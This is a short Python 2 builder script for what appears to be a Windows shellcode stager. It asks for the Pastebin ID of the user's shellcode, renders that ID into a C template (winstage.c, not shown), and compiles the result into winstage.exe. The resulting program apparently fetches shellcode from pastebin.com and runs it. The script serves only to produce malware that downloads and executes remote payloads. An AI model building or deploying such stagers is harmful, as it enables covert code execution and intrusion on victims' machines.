#!/usr/bin/env python

import os
import sys
import subprocess
from jinja2 import Template

def yesOrNo(prompt):
    """ A wrapped raw_input that expects a yes or no from the user """
    yes = set(['yes', 'y', 'ye'])
    no = set(['no', 'n', ''])
    # blank defaults to no

    while True:
        choice = raw_input(prompt).lower()

        if choice in yes:
            return True
        elif choice in no:
            return False
        else:
            print("Please respond with 'yes/y' or 'no/n'!")

basePath = os.path.dirname(os.path.abspath(__file__))

with open('winstage.c', 'rb') as f:
    rawCode = f.read()

template = Template(rawCode)

pbCode = raw_input("Please enter the 8 digit pastebin ID of your shellcode (seen in the url as \"pastebin.com/raw.php?i=<the code>\"): ")

errorHandling = yesOrNo("Would you like to include error handling? [y/N]: ")

renderedCode = template.render(pbCode=pbCode, errorHandling=errorHandling)

# TODO use tempfiles: https://docs.python.org/2/library/tempfile.html#module-tempfile
with open('winstage-generated.c', 'wb') as f:
    f.write(renderedCode)

subprocess.check_call(['make'])
filesize = os.path.getsize(os.path.join(basePath, "winstage.exe"))
print("Final file size is {} bytes.".format(filesize))
